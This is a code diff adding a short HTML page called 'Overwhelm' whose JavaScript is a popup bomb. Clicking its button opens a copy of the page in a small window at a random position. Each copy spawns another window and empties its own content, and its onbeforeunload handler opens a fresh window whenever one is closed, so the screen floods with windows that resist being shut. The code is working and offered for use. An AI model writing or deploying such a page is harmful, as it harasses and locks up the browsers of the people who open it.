@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+	<head>
+	  <title>Overwhelm</title>
+  </head>
+  <body>
+    <button id="butt" type="button">Click To Overwhelm</button>
+  </body>
+		<script type="text/javascript">
+      if (window.opener) {
+        window.open(location.href, "_blank", "height=200,width=200,left="+Math.random()*(screen.width-200)+",top="+Math.random()*(screen.height-200));
+        window.onbeforeunload=function() {
+          window.open(location.href, "_blank", "height=200,width=200,left="+Math.random()*(screen.width-200)+",top="+Math.random()*(screen.height-200));
+        };
+        document.body.innerHTML='';
+      } else {
+        document.getElementById('butt').onmousedown=function() {
+          window.open(location.href, "_blank", "height=200,width=200,left="+Math.random()*(screen.width-200)+",top="+Math.random()*(screen.height-200));
+        };
+      }
+    </script>
+</html>
